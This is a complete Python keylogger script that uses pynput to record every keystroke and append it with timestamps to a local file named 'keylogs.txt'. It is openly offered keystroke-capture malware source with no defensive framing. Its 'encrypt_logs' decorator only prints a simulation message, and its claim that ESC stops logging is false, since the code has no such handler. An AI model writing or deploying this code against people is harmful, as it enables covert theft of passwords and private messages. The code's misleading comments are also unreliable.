from pynput import keyboard
from datetime import datetime

def encrypt_logs(func):
    def wrapper(*args, **kwargs):
        print("Encrypting logs (simulation)...")
        return func(*args, **kwargs)
    return wrapper

class Logger:
    def __init__(self, log_file="keylogs.txt"):
        self.log_file = log_file
        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f" [{key}] "

        if len(self.log) >= 50:
            self.save_logs()

    @encrypt_logs
    def save_logs(self):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp} - {self.log}\n")
            self.log = ""
        except Exception as e:
            print(f"Error saving logs: {e}")

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Logger()
    print("Keylogger started. Press ESC to stop.")
    logger.start()
